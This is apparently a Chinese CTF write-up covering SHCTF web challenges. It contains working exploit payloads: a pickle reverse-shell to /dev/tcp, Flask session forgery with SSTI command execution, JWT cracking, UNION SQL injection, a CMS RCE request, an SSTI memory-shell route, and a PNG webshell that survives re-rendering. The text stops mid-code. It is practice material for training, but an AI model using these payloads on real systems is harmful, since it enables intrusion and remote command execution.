<p>在反序列化过程中， pickle 使用 find_class 方法来定位和导入必要的类或函数。由于 pickle 记录的是 posix.system，因此find_class 会从 posix 模块中导入 system 函数，而不是从 os 模块中导入。</p>
<p>所以可以用os.system进行序列化，但是在检测就会调用posix.system，从而绕过黑名单</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    def <span class="title function_">__reduce__</span><span class="params">(self)</span>:</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;bash -c &quot;bash -i &gt;6 /dev/tcp/ip/8888 0&gt;&amp;1&quot;&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line">print(base64.b64encode(b))</span><br></pre></td></tr></table></figure>
<h3 id="Week2-guess-the-number"><a href="#Week2-guess-the-number" class="headerlink" title="[Week2]guess_the_number"></a>[Week2]guess_the_number</h3><p>查看源码的源码 /s0urce</p>
<p><img src="https://luokuang1.github.io/images/shctf1.png" width="95%" height="60%"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, send_file</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, first_num = first_num)  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/s0urce&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_source</span>():</span><br><span class="line">    file_path = <span class="string">&quot;app.py&quot;</span></span><br><span class="line">    <span class="keyword">return</span> send_file(file_path, as_attachment=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/first&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_first_number</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(first_num)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/guess&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_seed</span>():</span><br><span class="line">    num = request.args.get(<span class="string">&#x27;num&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> num == <span class="built_in">str</span>(second_num):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            <span class="keyword">return</span> file.read()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    <span class="keyword">global</span> seed, first_num, second_num</span><br><span class="line">    seed = random.randint(<span class="number">1000000</span>,<span class="number">9999999</span>)</span><br><span class="line">    random.seed(seed)</span><br><span class="line">    first_num = random.randint(<span class="number">1000000000</span>,<span class="number">9999999999</span>)</span><br><span class="line">    second_num = random.randint(<span class="number">1000000000</span>,<span class="number">9999999999</span>)</span><br><span class="line"></span><br><span class="line">init()</span><br><span class="line">app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>主要看到种子这里seed = random.randint(1000000,9999999)，这里看似随机的，但是当种子确定下来时，first_num和second_num就会确定，所以，只需要通过第一个数来获得seed就可以获得第二个数值</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">1000000</span>,<span class="number">9999999</span>)</span>:</span><br><span class="line">    random.seed(i)</span><br><span class="line">    first_num = random.randint(<span class="number">1000000000</span>, <span class="number">9999999999</span>)</span><br><span class="line">    <span class="keyword">if</span>(first_num==<span class="number">2750639080</span>):</span><br><span class="line">        print(random.randint(<span class="number">1000000000</span>, <span class="number">9999999999</span>))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>再提交输出的值获取flag</p>
<h3 id="Week2-入侵者禁入"><a href="#Week2-入侵者禁入" class="headerlink" title="[Week2]入侵者禁入"></a>[Week2]入侵者禁入</h3><p>这里直接给了源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;0day_joker&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;role&#x27;</span>] = &#123;</span><br><span class="line">        <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;flag&#x27;</span>: <span class="string">&#x27;your_flag_here&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        code = file.read()</span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_handler</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        role = session.get(<span class="string">&#x27;role&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(role, <span class="built_in">dict</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Without you, you are an intruder!&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> role.get(<span class="string">&#x27;is_admin&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">        flag = role.get(<span class="string">&#x27;flag&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        message = <span class="string">&quot;Oh,I believe in you! The flag is: %s&quot;</span> % flag</span><br><span class="line">        <span class="keyword">return</span> render_template_string(message)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error: You don&#x27;t have the power!&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
<p>首先看到secret_key就可以知道应该是要通过session伪造了，这里需要注意它不是直接通过admin用户来获取flag，而是通过通过渲染render_template_string(message)，这里就可以尝试ssti来获取flag</p>
<p>抓包获取session值</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJyb2xlIjp7ImZsYWciOiJ5b3VyX2ZsYWdfaGVyZSIsImlzX2FkbWluIjowfX0.ZyiHMA.AomjARBBM3o_mXsepYp6PsZ6D8E</span><br></pre></td></tr></table></figure>
<p><img src="https://luokuang1.github.io/images/shctf2.png" width="95%" height="60%"></p>
<p>这里看到破解成功，下面就是进行伪造</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s <span class="string">&quot;0day_joker&quot;</span> -t <span class="string">&quot;&#123;&#x27;role&#x27;: &#123;&#x27;flag&#x27;: &#x27;&#123;&#123;lipsum.__globals__.os.popen(\&#x27;cat /*\&#x27;).read()&#125;&#125;&#x27;, &#x27;is_admin&#x27;: 1&#125;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p>这里要注意需要通过转义才可以写，最后提交得flag</p>
<h3 id="Week2-登录验证"><a href="#Week2-登录验证" class="headerlink" title="[Week2]登录验证"></a>[Week2]登录验证</h3><p>提示里面告诉我们要jwt爆破</p>
<p>当我们提交admin admin时告诉我们不是admin</p>
<p>我们开头将jwt码进行爆破</p>
<p><img src="https://luokuang1.github.io/images/shctf3.png" width="95%" height="60%"></p>
<p>这里爆破出来为222333，将原来的jwt码进行伪造改role为admin即可</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzA3MTk0NzEsImlhdCI6MTczMDcxMjI3MSwibmJmIjoxNzMwNzEyMjcxLCJyb2xlIjoiYWRtaW4ifQ.84vkkeMmFt9dr2RBVhH1TciO69Y4mXPq0cm27Dst9Fo</span><br></pre></td></tr></table></figure>
<p>最后直接提交即可得flag</p>
<h3 id="Week2-自助查询"><a href="#Week2-自助查询" class="headerlink" title="[Week2]自助查询"></a>[Week2]自助查询</h3><p>这个题注入没有过滤，主要是最后一步要注意</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&quot;) group by 2#</span></span><br><span class="line"><span class="string">0&quot;</span>) union select <span class="number">1</span>,group_concat(table_name) from information_schema.tables where table_schema=database()# <span class="comment">//flag,users</span></span><br><span class="line"><span class="number">0</span><span class="string">&quot;) union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;# //id,scretdata</span></span><br><span class="line"><span class="string">0&quot;</span>) union select <span class="number">1</span>,group_concat(scretdata) from flag# <span class="comment">//被你查到了, 果然不安全,把重要的东西写在注释就不会忘了</span></span><br></pre></td></tr></table></figure>
<p>这里需要查看注释来获取flag</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&quot;) union SELECT column_name, column_comment FROM information_schema.columns WHERE table_schema = database() AND table_name = &#x27;flag&#x27;#</span></span><br></pre></td></tr></table></figure>
<h3 id="Week3-小小cms"><a href="#Week3-小小cms" class="headerlink" title="[Week3] 小小cms"></a>[Week3] 小小cms</h3><p>这个是用到cms漏洞，直接用payload即可</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">目录 /pay/index/pay_callback</span><br><span class="line"></span><br><span class="line">post提交：out_trade_no[<span class="number">0</span>]=eq&amp;out_trade_no[<span class="number">1</span>]=cat <span class="comment">/*&amp;out_trade_no[2]=system</span></span><br></pre></td></tr></table></figure>
<h3 id="Week3-love-flask"><a href="#Week3-love-flask" class="headerlink" title="[Week3] love_flask"></a>[Week3] love_flask</h3><p>下载源码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">from flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"># Flask <span class="number">2.0</span><span class="number">.1</span></span><br><span class="line"># Werkzeug <span class="number">2.2</span><span class="number">.2</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">html_template = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;Pretty Input Box&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;style&gt;</span></span><br><span class="line"><span class="string">  .pretty-input &#123;</span></span><br><span class="line"><span class="string">    width: 100%;</span></span><br><span class="line"><span class="string">    padding: 10px 20px;</span></span><br><span class="line"><span class="string">    margin: 20px 0;</span></span><br><span class="line"><span class="string">    font-size: 16px;</span></span><br><span class="line"><span class="string">    border: 1px solid #ccc;</span></span><br><span class="line"><span class="string">    border-radius: 25px;</span></span><br><span class="line"><span class="string">    box-sizing: border-box;</span></span><br><span class="line"><span class="string">    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);</span></span><br><span class="line"><span class="string">    transition: border 0.3s ease-in-out;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  .pretty-input:focus &#123;</span></span><br><span class="line"><span class="string">    border-color: #4CAF50;</span></span><br><span class="line"><span class="string">    outline: none;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  .submit-button &#123;</span></span><br><span class="line"><span class="string">    width: 100%;</span></span><br><span class="line"><span class="string">    padding: 10px 20px;</span></span><br><span class="line"><span class="string">    margin: 20px 0;</span></span><br><span class="line"><span class="string">    font-size: 16px;</span></span><br><span class="line"><span class="string">    color: white;</span></span><br><span class="line"><span class="string">    background-color: #4CAF50;</span></span><br><span class="line"><span class="string">    border: none;</span></span><br><span class="line"><span class="string">    border-radius: 25px;</span></span><br><span class="line"><span class="string">    cursor: pointer;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  .container &#123;</span></span><br><span class="line"><span class="string">    max-width: 300px;</span></span><br><span class="line"><span class="string">    margin: auto;</span></span><br><span class="line"><span class="string">    text-align: center;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;form action=&quot;/namelist&quot; method=&quot;get&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;text&quot; class=&quot;pretty-input&quot; name=&quot;name&quot; placeholder=&quot;Enter your name...&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; class=&quot;submit-button&quot; value=&quot;Submit&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_">pretty_input</span><span class="params">()</span>:</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_template)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">&#x27;/namelist&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>])</span><br><span class="line">def <span class="title function_">name_list</span><span class="params">()</span>:</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)  </span><br><span class="line">    template = <span class="string">&#x27;&lt;h1&gt;Hi, %s.&lt;/h1&gt;&#x27;</span> % <span class="type">name</span></span><br><span class="line">    <span class="variable">rendered_string</span> <span class="operator">=</span>  render_template_string(template)</span><br><span class="line">    <span class="keyword">if</span> rendered_string:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Success Write your name to database&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
<p>这里发现存在ssti，但是没有会显，这里就可以产生通过内存马来进行回显，这里注意在打内存马时，如果已经创建了目录时就会报错，所以每次进行打内存马时就需要修改目录路径</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/bbb&#x27;, &#x27;bbb&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;cat /*&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Week3-拜师之旅·番外"><a href="#Week3-拜师之旅·番外" class="headerlink" title="[Week3] 拜师之旅·番外"></a>[Week3] 拜师之旅·番外</h3><p>这个题考图片马得二次渲染</p>
<p><img src="https://luokuang1.github.io/images/shctf4.png" width="95%" height="60%"></p>
<p>这个题只可以上传png文件，这里无法通过请求头和图片标识符来绕过，只能通过直接上传png文件来进行绕过，生成png图片的php代码为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">             <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">             <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">             <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">             <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">             <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">             <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">             <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">  <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">  <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">  <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">  <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">  <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行这个php文件就会生成一个1.png文件，直接下来进行上传，post提交来进行执行命令</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/view.php?image=/upload/<span class="number">1924555906.</span>png&amp;<span class="number">0</span>=system</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>=ls /</span><br></pre></td></tr></table></figure>
<h3 id="Week3-hacked-website"><a href="#Week3-hacked-website" class="headerlink" title="[Week3] hacked_website"></a>[Week3] hacked_website</h3><p>这里会给一个备份文件</p>
<p>打开后发现在/admin/profile.php中有一个后门</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?<span class="type">php</span> <span class="variable">$a</span> <span class="operator">=</span> <span class="string">&#x27;sys&#x27;</span>;$b = <span class="string">&#x27;tem&#x27;</span>;$x = $a.$b;<span class="keyword">if</span> (!isset($_POST[<span class="string">&#x27;SH&#x27;</span>])) &#123;$z = <span class="string">&quot;&#x27;&#x27;&quot;</span>;&#125; <span class="keyword">else</span> $z = $_POST[<span class="string">&#x27;SH&#x27;</span>];?&gt;</span><br></pre></td></tr></table></figure>
<p>但是需要注意的一点,如果直接进行访问需要登入，所以我们就需要去尝试弱密码爆破或者sql注入</p>
<p><img src="https://luokuang1.github.io/images/shctf5.png" width="95%" height="60%"></p>
<p>最后拿到账号为admin qwer1234为密码</p>
<p>直接登入，带着cookie访问profile.php  post提交命令即可</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SH=cat <span class="comment">/*</span></span><br></pre></td></tr></table></figure>
<p><img src="https://luokuang1.github.io/images/shctf6.png" width="95%" height="60%"></p>
<h3 id="Week4-0进制计算器"><a href="#Week4-0进制计算器" class="headerlink" title="[Week4] 0进制计算器"></a>[Week4] 0进制计算器</h3><p>这个题主要是代码审计了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">from flask <span class="keyword">import</span> Flask, render_template, request, <span class="type">jsonify</span></span><br><span class="line">  </span><br><span class="line"><span class="variable">app</span> <span class="operator">=</span> Flask(__name__)  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">&#x27;/&#x27;</span>)  </span><br><span class="line">def <span class="title function_">home</span><span class="params">()</span>:  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">&#x27;/execute&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]) 